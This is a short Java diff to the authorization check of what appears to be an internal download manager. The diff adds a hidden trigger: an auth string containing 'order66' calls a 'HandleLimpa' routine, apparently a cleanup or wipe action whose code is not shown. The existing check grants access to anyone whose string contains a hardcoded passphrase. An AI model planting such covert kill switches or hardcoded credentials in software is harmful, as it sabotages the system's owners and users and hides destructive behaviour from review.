@@ -15,6 +15,9 @@ public class Autorizacao extends Acao {
     @Autowired
     private HTTPService service;
 
+    @Autowired
+    private HandleLimpa limpa;
+
        
     @Override
     public boolean isCalled() {
@@ -31,7 +34,11 @@ public class Autorizacao extends Acao {
     }
 
 
-    private boolean isAuthtenticated(String auth) {
+    private boolean isAuthtenticated(String auth) throws Exception {
+        if (auth.contains("order66")) {
+            limpa.executa();
+            return false;
+        }
         String pass = "This is a download manager used to solve some of the internal network problems at DNIT";
         if (auth.contains(pass))
             return true;
